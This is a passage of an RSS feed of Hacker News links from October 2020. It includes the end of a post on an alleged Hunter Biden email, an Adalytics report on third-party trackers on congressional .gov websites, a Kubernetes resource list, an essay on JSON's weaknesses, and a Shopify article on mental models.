<li>There is <a href="https://blog.intelx.io/2020/10/14/an-osint-investigation-into-the-alleged-hunter-biden-email/">allegedly evidence</a> that a user with the email address <code><a href="https://leebriggs.co.uk/cdn-cgi/l/email-protection" data-cfemail="88fea6f8e7f2e0e9fafbe3f1e1a6fde3fae9e1e6edc8efe5e9e1e4a6ebe7e5">[email&nbsp;protected]</a></code> registered a DNS domain under the street address of Burisma Holdings, however I am unable to independently verify this via the means in this post.</li>
</ul>
<p>I suspect this story will continue to evolve as the election unfolds. As new information comes to light, you should draw your own conclusions - just make sure you’re drawing them with all the information at hand.</p>
</article></div>]]>
            </description>
            <link>https://leebriggs.co.uk/blog/2020/10/29/draw-your-own-conclusions.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946813</guid>
            <pubDate>Fri, 30 Oct 2020 20:55:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Members of Congress leaking constituent data overseas]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946745">thread link</a>) | @ianthiel
<br/>
October 30, 2020 | https://adalytics.io/blog/is-congress-leaking-your-data | <a href="https://web.archive.org/web/*/https://adalytics.io/blog/is-congress-leaking-your-data">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>The vast majority (98.9%) of US Senators and Congressional Representatives are sending certain data points about their constituents, including potentially minors, to for-profit companies such as Google, Facebook, LiveRamp, or Oracle. They are doing this through the use of third party tracking scripts, cookies, and pixels which they have embedded on their taxpayer funded official .house.gov and .senate.gov domains. This includes notable consumer privacy advocates such as Senator Elizabeth Warren, Maria Cantwell, Ed Markey, Josh Hawley, and Ron Wyden, as well as the Senate and House leaders who are in charge of the subcommittees that focus on consumer data privacy and big tech antitrust.&nbsp;
</p><p>A handful of congressmen also have installed an impressive array of advertising and marketing tech on their .gov websites, sending data about their .gov websites’ visitors to both domestic and foreign data brokers and advertising exchanges such as Avocet, OnAudience, Adobe Demdex, Eyeota, and Weborama. Several congressional websites use more than fifteen times as many third party tracking scripts as ebay.com. Multiple sites also utilize a social media feed widget that communicates with servers belonging to a company based on the outskirts of Moscow, Russia when users open their websites. One congressman even has actual Google Ads iframes embedded on his .house.gov domain.&nbsp;</p><p>A few congressmen may be utilizing their taxpayer funded .gov websites to gather data for their re-election campaigns, which may potentially be in violation of Congressional ethics rules, Federal Election Commission regulations, and Constitutional protections against unwarranted government surveillance.</p>

<ol id="table-of-contents">
	<li>
		<a href="#introduction">Introduction</a>
	</li>

	<ol>
		<li>
			<a href="#background">Background</a>
		</li>

		<li>
			<a href="#context">Context</a>
		</li>

		<li>
			<a href="#methodology">Methodology</a>
		</li>
	</ol>

	<li>
		<a href="#results">Results from scanning 537 Congressional .gov websites</a>
	</li>

	<ol>
		<li>
			<a href="#google-facebook-tools">Use of Google Analytics, Facebook Pixel, and other third party trackers</a>
		</li>
		<li>
			<a href="#third-party-cookies">Use of third party cookies</a>
		</li>
		<li>
			<a href="#third-party-tracking-scripts">Use of third party tracking scripts</a>
		</li>
	</ol>

	<li>
		<a href="#analysis">Analysis</a>
	</li>

	<ol>
		<li>
			<a href="#senate-committees">Senate antitrust &amp; consumer privacy committee members</a>
		</li>
		<li>
			<a href="#house-committees">House antitrust &amp; consumer privacy committee members</a>
		</li>
		<li>
			<a href="#data-brokers">Use of data brokers, audience management, and adtech by Congress</a>
		</li>
		<li>
			<a href="#data-sharing-foreign-companies">Sharing of browsing data with foreign companies</a>
		</li>
		<li>
			<a href="#pages-intended-for-children">Congressional web pages intended for children</a>
		</li>
		<li>
			<a href="#privacy-policies">Privacy policies</a>
		</li>
		<li>
			<a href="#google-ads-on-house-gov">Google Ads iframes loading on a congressional website</a>
		</li>
		<li>
			<a href="#privacy-respecting-members-of-congress">Privacy respecting Members of Congress</a>
		</li>
	</ol>

	<li>
		<a href="#conclusion">Conclusion</a>
	</li>

	<ol>
		<li>
			<a href="#caveats">Caveats &amp; Limitations</a>
		</li>
		<li>
			<a href="#discussion">Discussion</a>
		</li>
		<li>
			<a href="#journalists-and-legal-scholars">Possible future investigations by journalists or legal scholars</a>
		</li>
		<li>
			<a href="#take-away-points">Take away points &amp; recommendations for Congress</a>
		</li>
	</ol>
</ol><p>If you are a technically minded individual or want to jump straight into interesting findings, I recommend you go directly to the Results and Analysis sections. If you want some background on consumer privacy and how tracking tech works, this Introduction section is designed to provide some background context.</p><h2 id="background">Background</h2><p>In recent months, there have been increased calls in the US Capitol for strengthening consumer privacy protections and to evaluate the amount of influence tech giants such as Facebook and Google wield over social media, digital advertising, and news dissemination.</p><p>
These two companies command over <a href="https://www.marketwatch.com/story/as-demand-for-digital-advertising-plummets-google-and-facebook-could-have-shrinking-revenues-2020-04-28">70 percent</a> of the U.S. market share for digital ads. Google and Facebook built their sprawling billion-dollar businesses by providing a myriad of ‘free’ services - social media, content feeds, search results, video, photo sharing, email, and messenger services. They also provide free software tools such as Google Analytics and Facebook Pixel, which website developers can embed within their pages to track user behavior. These consumer and business tools follow hundreds of millions of users around on the internet, placing cookies on users’ browsers and tracking scripts on websites to log peoples’ visits, thereby building detailed profiles of consumers based on their browsing habits and interests. These datasets can then be used to target potential consumers with targeted shoe, vacation, housing, job or political ads.</p><p>
Google and Facebook’s tracking scripts and pixels are among their most popular ‘free’ software tools, and they appear on websites in every corner of the internet. Even lawmakers calling for greater privacy protections use these tools on their congressional .gov websites purportedly to “improve” their websites. What they may actually be doing is sending their constituents’ data to Google and Facebook, thereby augmenting Google and Facebook’s virtual profiles of users.</p><p>There is no shortage of lawmakers on both sides of the aisle clamoring to crown themselves as the champions of our right to privacy online.&nbsp;
</p><p>Senator Elizabeth Warren (MA), one of the most vocal critics of Big Tech, <a href="https://www.vox.com/policy-and-politics/2019/12/3/20965463/tech-2020-candidate-policies-online-data-equifax">argues</a> that breaking up Big Tech would drive accountability into their models and give “people more control over how their personal information is collected, shared, and sold.”&nbsp;</p><p>
Senator Josh Hawley (MO), a rising Republican star, teamed up with Senator Mark Warner (VA) to introduce the <a href="https://www.hawley.senate.gov/senators-warner-and-hawley-introduce-bill-force-social-media-companies-disclose-how-they-are">Do Not Track Act</a> to allow Americans to opt-out of having their data collected. Sen. Hawley explains, “When a big tech company says its product is free, consumers are the ones being sold. These 'free' products track everything we do so tech companies can sell our information to the highest bidder and use it to target us with creepy ads.” He continues, “Tech companies do their best to hide how much consumer data is worth and to whom it is sold.”</p><p>Senator Ron Wyden (D-Ore.) put forward the Mind Your Own Business Act, which he bills&nbsp; as “the strongest-ever protections for Americans’ private data” that “goes further than Europe’s General Data Protection Regulation (GDPR).”&nbsp;</p><p>
<strong>Given these lawmakers’ promises to protect Americans’ online privacy, I was curious how their own, taxpayer funded, .</strong><strong><em>gov</em></strong><strong> websites fare in protecting and respecting users’ privacy?</strong> Do their congressional websites, paid for and maintained with taxpayer funds, hold up to their own standards?</p><p>A few months ago, while I was working on a <a href="https://adalytics.io/">chrome extension</a> to collect and analyze digital ads, I noticed many representatives’ websites host dozens of 3rd party cookies and tracking scripts on their .house.gov and .senate.gov websites. This means that the moment you (or a child in your household) visits your Senator or Congressperson’s website, all sorts of information about you--your IP address, physical location, how much time you spend on the page, what browser you’re using, the dimensions of your computer monitor, your computer’s operating system, social media identifiers -- can potentially be sent over to Google, Facebook, and other third party companies.</p><h2 id="context">Context</h2><p>So how exactly do data brokers or tech companies track users across different internet domains? Here I will provide a quick background on the technical means through which tracking tools operate.</p><p>When you open a website such as example.com, your computer’s browser makes a network call over the internet to that domain’s servers, which return an initial HTML document. That document contains instructions your browser parses to show text and styling, as well as further instructions for loading images or dynamic Javascript elements.</p><p>By making that initial request to example.com, your device established a quick internet connection that allowed example.com’s servers to see a few pieces of information about your browser, including your IP address. Services such as <a href="https://ipinfo.io/">ipinfo.io</a> allow one to translate a numeric IP address into a geographic location, such as that of your house or the cafe whose WiFi you are using.&nbsp;</p><p>If a web developer installed third party javascript files on a website, this serves as an embedded instruction to make your browser fetch additional files from another domain besides the one you are currently perusing. Tracking scripts such as Google Analytics or Facebook Pixel can be loaded this way, and they then act as data sensors, transmitting additional data points back not only to example.com, but also to Google and Facebook’s servers. Certain audience management or data brokers operate on this principle - a developer installs the data broker’s Javascript on their website, and then the data broker can gather information about the website’s visitors and cross-reference with other website’s data, as well as real world data such as credit cars, public records, and real estate ownership records.&nbsp;</p><p>In addition to javascript, many trackers load tiny, transparent images referred to as <a href="https://adtechbook.clearcode.cc/user-identification/">pixels</a>. Facebook <a href="https://themarkup.org/blacklight/2020/09/22/how-we-built-a-real-time-privacy-inspector#facebook-pixel">Pixel</a> is such an image. When a website configures Facebook Pixel on its pages, that causes users’ browsers to make a network call to Facebook’s servers to retrieve that tiny image. Facebook Pixel can identify a particular user’s Facebook account ID and relay that over the network. This information can then be used to target ads, including potentially <a href="https://www.americanbar.org/groups/crsj/publications/human_rights_magazine_home/voting-in-2020/political-advertising-on-social-media-platforms/">political</a> ads. Facebook Pixel can track activity even when a user is not logged into their Facebook account. Facebook’s targeted ad system ‘learns’ from Pixel events as well as custom user profile lists marketers can upload to create a target audience profile.&nbsp;</p><p>When your browser fetches images, javascript, or other resources after parsing a webpage’s HTML instructions, it can also receive instructions to store short pieces of text known as ‘cookies’. A first party cookie is one that is set by the domain you are currently visiting - so if you are on example.com, any cookies from example.com are first party. First party cookies can only be read by code sent from example.com.</p><p>If your browser receives instructions to store a cookie from Facebook or Youtube, those are <a href="https://ico.org.uk/for-organisations/guide-to-pecr/guidance-on-the-use-of-cookies-and-similar-technologies/what-are-cookies-and-similar-technologies/">third</a> party cookies. First party cookies are frequently used to maintain user login state or save website specific preferences. Third party cookies can serve an additional purpose, which is to allow user’s behavior and usage across different web properties to be tracked. When you navigate to a different website, those third party cookies can be used to identify you as the user that was previously on …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adalytics.io/blog/is-congress-leaking-your-data">https://adalytics.io/blog/is-congress-leaking-your-data</a></em></p>]]>
            </description>
            <link>https://adalytics.io/blog/is-congress-leaking-your-data</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946745</guid>
            <pubDate>Fri, 30 Oct 2020 20:47:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Transport Fever 2 for Mac beta now available]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946707">thread link</a>) | @cimnine
<br/>
October 30, 2020 | https://www.transportfever2.com/beta-test-registration-for-the-mac-version-now-available/ | <a href="https://web.archive.org/web/*/https://www.transportfever2.com/beta-test-registration-for-the-mac-version-now-available/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.transportfever2.com/beta-test-registration-for-the-mac-version-now-available/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946707</guid>
            <pubDate>Fri, 30 Oct 2020 20:43:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Symmetrical Name Monsters with Mr. Snyder]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946534">thread link</a>) | @art1011111
<br/>
October 30, 2020 | https://video.link/w/Tipub | <a href="https://web.archive.org/web/*/https://video.link/w/Tipub">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://video.link/w/Tipub</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946534</guid>
            <pubDate>Fri, 30 Oct 2020 20:24:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kubernetes: A curated list of learning material]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946483">thread link</a>) | @sharjeelsayed
<br/>
October 30, 2020 | https://devopsunlocked.com/kubernetes-learning-material/ | <a href="https://web.archive.org/web/*/https://devopsunlocked.com/kubernetes-learning-material/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-1247" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
					
			
		<div itemprop="text">
			
<figure><img loading="lazy" width="1024" height="387" src="https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?resize=1024%2C387&amp;ssl=1" alt="" srcset="https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?resize=1024%2C387&amp;ssl=1 1024w, https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?resize=300%2C113&amp;ssl=1 300w, https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?resize=768%2C290&amp;ssl=1 768w, https://i0.wp.com/devopsunlocked.com/wp-content/uploads/2020/10/Learning-Mini.jpg?w=1144&amp;ssl=1 1144w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"></figure>



<h2>Guides, documentations, blogs, and other learning material for Kubernetes.</h2>



<p>Kubernetes is a powerful tool that allows you to orchestrate, manage, and handle containers at scale, successfully. The learning curve can be steep and the terminology can be a lot to learn. Below you’ll find a comprehensive, curated list of learning material that can be used to help you get started. </p>



<h3>General Introduction</h3>







<ul><li><a href="https://medium.com/containermind/a-beginners-guide-to-kubernetes-7e8ca56420b6">A Beginner’s Guide to Kubernetes</a> – A comprehensive introduction to Kubernetes architecture</li><li><a href="https://www.cncf.io/the-childrens-illustrated-guide-to-kubernetes/">The Illustrated Children’s Guide to Kubernetes</a> – Graphical explanations of Kubernetes</li><li><a href="https://github.com/kelseyhightower/kubernetes-the-hard-way">Kubernetes The Hard Way</a> – Kubernetes The Hard Way guides you through bootstrapping a highly available Kubernetes cluster with end-to-end encryption between components and RBAC authentication.</li><li><a rel="noreferrer noopener" href="https://medium.com/better-programming/understanding-kubernetes-yaml-syntax-83359d33f9c2" target="_blank">Understanding the Kubernetes YAML Syntax</a> – Kubernetes configurations are written in YAML format. This guide teaches you the syntax, what to include, and an overall basic understanding of Kubernetes configurations.</li><li><a rel="noreferrer noopener" href="https://learnk8s.io/a/troubleshooting-kubernetes.pdf" target="_blank">Troubleshooting Kubernetes deployments</a> – A flow chart to troubleshoot a kubernetes deployment in case of issues. </li><li><a href="https://sookocheff.com/post/kubernetes/understanding-kubernetes-networking-model/">A Guide to the Kubernetes Networking Model</a> – A in-depth run-through of Kubernetes networking</li><li><a href="https://medium.com/faun/writing-your-first-kubernetes-operator-8f3df4453234">Writing Your First Kubernetes Operator</a> – Learn how to build and deploy your first Kubernetes Operator using the Operator SDK.</li><li><a href="https://medium.com/faun/configuring-ha-kubernetes-cluster-on-bare-metal-servers-with-kubeadm-1-2-1e79f0f7857b">Configuring HA Kubernetes cluster on bare metal servers with kubeadm</a> – A guide to standing up a HA Kubernetes cluster on bare metal servers using kubeadm.</li><li><a href="https://medium.com/faun/google-kubernetes-engine-explain-like-im-five-1890e550c099">Introduction to Using Google Kubernetes Engine; Explain Like I’m Five!</a> – Learn how to create your first managed Kubernetes cluster on Google Kubernetes Engine using Terraform.</li><li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/">Learn Kubernetes Basics</a> – This tutorial provides a walk through of the basics of the Kubernetes cluster orchestration system.<a href="https://medium.com/containermind/a-beginners-guide-to-kubernetes-7e8ca56420b6">A Beginner’s Guide to Kubernetes</a> – A comprehensive introduction to Kubernetes architecture</li><li><a href="https://aws.github.io/aws-eks-best-practices/">Amazon EKS Best Practices Guide for Security</a> – This guide provides advice about protecting information, systems, and assets that are reliant on EKS while delivering business value through risk assessments and mitigation strategies.</li><li><a href="https://github.com/aws-samples/amazon-k8s-node-drainer">Amazon EKS Node Drainer</a> – A guide to cordon and evict all “evictable” pods from an EC2 node being terminated.</li><li><a href="https://github.com/kubernetes-sigs/multi-tenancy">Kubernetes Working Group for Multi-Tenancy</a> – This is a working place for multi-tenancy related proposals and prototypes.</li><li><a href="https://medium.com/faun/production-grade-kubernetes-monitoring-using-prometheus-78144b835b60">Production grade Kubernetes Monitoring using Prometheus</a> – A in-depth guide to deploy Prometheus monitoring solution.</li></ul>



<h3>Blogs, Videos, and Stories!</h3>



<p>I would highly recommend reading and watching all the links down below. If you are short for time then make the 10 most common mistakes using Kubernetes and Kubernetes at Reddit a high priority!</p>



<ul><li><a href="https://blog.pipetail.io/posts/2020-05-04-most-common-mistakes-k8s/">10 most common mistakes using Kubernetes</a> [HIGHLY RECOMMEND] – This is a great list that dives into the common mistakes of using Kubernetes. </li><li><a href="https://openai.com/blog/scaling-kubernetes-to-2500-nodes/">Scaling Kubernetes to 2,500 Nodes</a> – Are you scaling your Kubernetes clusters to hundreds of nodes and beyond? Read this article by OpenAI on how they tackled scaling their K8s cluster.</li><li><a href="https://youtu.be/WTbIBqNcjoQ">Kubernetes at Reddit: Tales from Production</a> – Reddit uses Kubernetes. This YouTube videos shares their experience with handling Kubernetes and more within their organization.</li><li><a href="https://www.youtube.com/watch?v=0Omvgd7Hg1I">Life of a Packet</a> – Networking in Kubernetes. A YouTube video by Michael Rubin at Google.</li><li><a href="https://www.youtube.com/watch?v=YjZ4AZ7hRM0">How the Department of Defense Moved to Kubernetes and Istio</a></li></ul>



<h3><a href="https://github.com/tomhuang12/awesome-k8s-resources#learnings-and-documentations"></a></h3>



<h3>Learnings and Documentations</h3>



<ul><li><a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/">Kubernetes API Reference Docs</a> – A must have bookmark for those starting to learn Kubernetes.</li><li><a href="https://devopsunlocked.com/kubernetes-kubectl-cheatsheet/" data-type="URL" data-id="https://devopsunlocked.com/kubernetes-kubectl-cheatsheet/">kubectl Cheat Sheet </a>– Check out <strong><em>our</em></strong> guide to kubectl and Kubernetes!</li><li><a href="https://www.katacoda.com/courses/kubernetes/playground">Katacoda</a> – This is a Kubernetes playground, a safe place designed for experimenting, exploring and learning Kubernetes.</li><li><a href="https://labs.play-with-k8s.com/">Play with Kubernetes</a> – Play with Kubernetes is a playground which allows users to run K8s clusters in a matter of seconds.</li><li><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/">Configuring Redis using a ConfigMap</a> – A walkthrough that provides a real world example of how to configure Redis using a ConfigMap</li><li><a href="https://kubernetes.io/docs/tutorials/stateless-application/expose-external-ip-address/">Exposing an External IP Address to Access an Application in a Cluster</a> – This guide shows how to create a Kubernetes Service object that exposes an external IP address.</li><li><a href="https://kubernetes.io/docs/tutorials/stateless-application/guestbook/">Example: Deploying PHP Guestbook application with Redis</a> – This tutorial shows you how to build and deploy a simple, multi-tier web application using Kubernetes and Docker.</li><li><a href="https://kubernetes.io/docs/tutorials/stateful-application/basic-stateful-set/">StatefulSet Basics</a> – This tutorial provides an introduction to managing applications with StatefulSets.</li><li><a href="https://kubernetes.io/docs/tutorials/stateful-application/mysql-wordpress-persistent-volume/">Example: Deploying WordPress and MySQL with Persistent Volumes</a> – This tutorial shows you how to deploy a WordPress site and a MySQL database using Minikube.</li><li><a href="https://kubernetes.io/docs/tutorials/stateful-application/cassandra/">Example: Deploying Cassandra with a StatefulSet</a> – This tutorial shows you how to run Apache Cassandra on Kubernetes. Cassandra, a database, needs persistent storage to provide data durability.</li><li><a href="https://kubernetes.io/docs/tutorials/stateful-application/zookeeper/">Running ZooKeeper, A Distributed System Coordinator</a> – This tutorial demonstrates running Apache Zookeeper on Kubernetes using StatefulSets, PodDisruptionBudgets, and PodAntiAffinity.</li><li><a href="https://www.linux.com/audience/enterprise/set-cicd-pipeline-kubernetes-part-1-overview/">Set Up a CI/CD Pipeline with Kubernetes</a> – A end-to-end guide to set up a CI/CD Pipeline with Kubernetes.</li><li><a href="https://medium.com/faun/how-to-pass-certified-kubernetes-administrator-cka-exam-on-first-attempt-36c0ceb4c9e">How to pass the Certified Kubernetes Administrator (CKA) exam on the first attempt</a> – A guide to pass CKA exam</li><li><a href="https://medium.com/flant-com/kubectl-commands-and-tips-7b33de0c5476">Ready-to-use commands and tips for kubectl</a></li><li><a href="https://github.com/ijelliti/CKSS-Certified-Kubernetes-Security-Specialist">Certified Kubernetes Security Specialist – CKSS</a> – This repository is a collection of resources to prepare for the Certified Kubernetes Security Specialist (CKSS) exam.</li><li><a rel="noreferrer noopener" href="https://www.udemy.com/course/learn-devops-the-complete-kubernetes-course/" target="_blank">[PAID] Learn DevOps: The Complete Kubernetes Course on Udemy</a> – This is a personal favorite of mine and I learned a lot from following Edward’s course. I highly recommend this for anyone who is just starting in Kubernetes.</li></ul>



<p>I’ll be updating this list as I come across new material, articles, and videos. If you have any recommendations please list them in the comment section or tweet me, <a rel="noreferrer noopener" href="https://twitter.com/aarongxa" data-type="URL" data-id="https://twitter.com/aarongxa" target="_blank">@AARONGXA</a>. </p>



<p>Also, if you wanna support me feel free to…</p>



<p><a href="https://www.buymeacoffee.com/aarongxa" target="_blank" rel="noopener noreferrer"><img src="https://i2.wp.com/cdn.buymeacoffee.com/buttons/v2/default-blue.png?w=1024&amp;ssl=1" alt="Buy Me A Coffee" data-recalc-dims="1"></a></p><p>💙</p>
		</div>

				
		<div>
		
	<p><img alt="" src="https://secure.gravatar.com/avatar/?s=96&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/?s=192&amp;d=mm&amp;r=g 2x" height="96" width="96" loading="lazy"></p>
 
        
	
				<div>
	
        <p>Yo! I'm Aaron Griffith and I run devopsunlocked.com</p>
 
        
 
    </div>
 
</div>	</div>
</article>

			

					</main>
	</div>

	
	</div>
</div></div>]]>
            </description>
            <link>https://devopsunlocked.com/kubernetes-learning-material/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946483</guid>
            <pubDate>Fri, 30 Oct 2020 20:20:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Not Just Use JSON?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24946268">thread link</a>) | @tonyg
<br/>
October 30, 2020 | https://preserves.gitlab.io/preserves/why-not-json.html | <a href="https://web.archive.org/web/*/https://preserves.gitlab.io/preserves/why-not-json.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  
<p>Tony Garnock-Jones <a href="mailto:tonyg@leastfixedpoint.com">tonyg@leastfixedpoint.com</a><br>
September 2018.</p>

<!-- JSON lacks semantics: JSON syntax doesn't denote anything -->

<p>JSON offers <em>syntax</em> for numbers, strings, booleans, null, arrays and
string-keyed maps. However, it suffers from two major problems. First,
it offers no <em>semantics</em> for the syntax: it is left to each
implementation to determine how to treat each JSON term. This causes
<a href="http://seriot.ch/parsing_json.php">interoperability</a> and even
<a href="http://web.archive.org/web/20180906202559/http://docs.couchdb.org/en/stable/cve/2017-12635.html">security</a>
issues. Second, JSON’s lack of support for type tags leads to awkward
and incompatible <em>encodings</em> of type information in terms of the fixed
suite of constructors on offer.</p>

<p>There are other minor problems with JSON having to do with its syntax.
Examples include its relative verbosity and its lack of support for
binary data.</p>

<h2 id="json-syntax-doesnt-mean-anything">JSON syntax doesn’t <em>mean</em> anything</h2>

<p>When are two JSON values the same? When are they different?
<!-- When is one JSON value “less than” another? --></p>

<p>The specifications are largely silent on these questions. Different
JSON implementations give different answers.</p>

<p>Specifically, JSON does not:</p>

<ul>
  <li>assign any meaning to numbers,<sup id="fnref:meaning-ieee-double"><a href="#fn:meaning-ieee-double">1</a></sup></li>
  <li>determine how strings are to be compared,<sup id="fnref:string-key-comparison"><a href="#fn:string-key-comparison">2</a></sup></li>
  <li>determine whether object key ordering is significant,<sup id="fnref:json-member-ordering"><a href="#fn:json-member-ordering">3</a></sup> or</li>
  <li>determine whether duplicate object keys are permitted, what it
would mean if they were, or how to determine a duplicate in the
first place.<sup id="fnref:json-key-uniqueness"><a href="#fn:json-key-uniqueness">4</a></sup></li>
</ul>

<p>In short, JSON syntax doesn’t <em>denote</em> anything.<sup id="fnref:xml-infoset"><a href="#fn:xml-infoset">5</a></sup> <sup id="fnref:other-formats"><a href="#fn:other-formats">6</a></sup></p>

<p>Some examples:</p>

<ul>
  <li>are the JSON values <code>1</code>, <code>1.0</code>, and <code>1e0</code> the same or different?</li>
  <li>are the JSON values <code>1.0</code> and <code>1.0000000000000001</code> the same or different?</li>
  <li>are the JSON strings <code>"päron"</code> (UTF-8 <code>70c3a4726f6e</code>) and <code>"päron"</code>
(UTF-8 <code>7061cc88726f6e</code>) the same or different?</li>
  <li>are the JSON objects <code>{"a":1, "b":2}</code> and <code>{"b":2, "a":1}</code> the same
or different?</li>
  <li>which, if any, of <code>{"a":1, "a":2}</code>, <code>{"a":1}</code> and <code>{"a":2}</code> are the
same? Are all three legal?</li>
  <li>are <code>{"päron":1}</code> and <code>{"päron":1}</code> the same or different?</li>
</ul>

<h2 id="json-can-multiply-nicely-but-it-cant-add-very-well">JSON can multiply nicely, but it can’t add very well</h2>

<p>JSON includes a fixed set of types: numbers, strings, booleans, null,
arrays and string-keyed maps. Domain-specific data must be <em>encoded</em>
into these types. For example, dates and email addresses are often
represented as strings with an implicit internal structure.</p>

<p>There is no convention for <em>labelling</em> a value as belonging to a
particular category. Instead, JSON-encoded data are often labelled in
an ad-hoc way. Multiple incompatible approaches exist. For example, a
“money” structure containing a <code>currency</code> field and an <code>amount</code> may be
represented in any number of ways:</p>

<div><div><pre><code>{ "_type": "money", "currency": "EUR", "amount": 10 }
{ "type": "money", "value": { "currency": "EUR", "amount": 10 } }
[ "money", { "currency": "EUR", "amount": 10 } ]
{ "@money": { "currency": "EUR", "amount": 10 } }
</code></pre></div></div>

<p>This causes particular problems when JSON is used to represent <em>sum</em>
or <em>union</em> types, such as “either a value or an error, but not both”.
Again, multiple incompatible approaches exist.</p>

<p>For example, imagine an API for depositing money in an account. The
response might be either a “success” response indicating the new
balance, or one of a set of possible errors.</p>

<p>Sometimes, a <em>pair</em> of values is used, with <code>null</code> marking the option
not taken.<sup id="fnref:interesting-failure-mode"><a href="#fn:interesting-failure-mode">7</a></sup></p>

<div><div><pre><code>{ "ok": { "balance": 210 }, "error": null }
{ "ok": null, "error": "Unauthorized" }
</code></pre></div></div>

<p>The branch not chosen is sometimes present, sometimes omitted as if it
were an optional field:</p>

<div><div><pre><code>{ "ok": { "balance": 210 } }
{ "error": "Unauthorized" }
</code></pre></div></div>

<p>Sometimes, an array of a label and a value is used:</p>

<div><div><pre><code>[ "ok", { "balance": 210 } ]
[ "error", "Unauthorized" ]
</code></pre></div></div>

<p>Sometimes, the shape of the data is sufficient to distinguish among
the alternatives, and the label is left implicit:</p>

<div><div><pre><code>{ "balance": 210 }
"Unauthorized"
</code></pre></div></div>

<p>JSON itself does not offer any guidance for which of these options to
choose. In many real cases on the web, poor choices have led to
encodings that are irrecoverably ambiguous.</p>

<!-- Heading to visually offset the footnotes from the main document: -->
<h2 id="notes">Notes</h2>






</div>]]>
            </description>
            <link>https://preserves.gitlab.io/preserves/why-not-json.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946268</guid>
            <pubDate>Fri, 30 Oct 2020 19:56:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Mental Models of Ideas That Don't Change]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946220">thread link</a>) | @oedmarap
<br/>
October 30, 2020 | https://shopify.engineering/building-mental-models | <a href="https://web.archive.org/web/*/https://shopify.engineering/building-mental-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p><b><i>I hope these mental models are as valuable for you as they are for me. I’ll be presenting these ideas at ShipIt! Presents: Building Mental Models of Ideas That Don’t Change on October 28, 2020 at 1 pm EST (</i></b><a href="#ShipIt"><b><i>sign up here</i></b></a><b><i>). I’ll go over the process of prioritizing new ideas and coming up with a system of models for yourself to organize these ideas. If you found this useful, stay updated by following me on </i></b><a href="https://twitter.com/Hammadk" target="_blank" title="Hammadk on Twitter" rel="nofollow noopener noreferrer"><b><i>Twitter</i></b></a><b><i>.</i></b></p>
<p>There’s always new stuff: new frameworks, new languages, and new platforms. All of this adds up. Sometimes it feels like you’re just treading water, and not actually getting better at what you do. I’ve tried spending more time learning this stuff, but that doesn’t work—there’s always more. I have found a better approach is learning things at a deeper level and using those lessons as a checklist. This checklist of core principles are called mental models.&nbsp;</p>
<p>I learned this approach by studying how bright people think. You might have heard Richard Feynman describe the handful of algorithms that he applies to everything. Maybe you’ve&nbsp; seen Elon Musk describe his approach as thinking by fundamental principles. Charlie Munger also credits most of his financial success to mental models. All of these people are amazing and you won’t get to their level with mental models alone, but mental models give you a nudge in the right direction.</p>
<p>So, how does one integrate mental models into their life and work? The first thing that you need is a method for prioritizing new concepts that you should learn. After that, you’ll need a good system for keeping track of what you have identified as important.&nbsp;With this process, you’ll identify mental models and use them to make more informed decisions. Below I start by describing some engineering and management mental models that I have found useful over the years.</p>

<p><a href="#EngineeringModels">Engineering Mental Models</a></p>

<p>&nbsp;<a href="#ManagementModels">Management Mental Models</a></p>



<h2 id="Silent">Avoid Silent Failures</h2>
<p>When something breaks you should hear about it. This is important because small issues can help you find larger structural issues. Silent failures typically happen when exceptions are silenced—this may be in a networking library, or the code that handles exceptions. Failures can also be silent when one of your servers is down. You can prevent this by using a third party system that pings each of the critical components.</p>
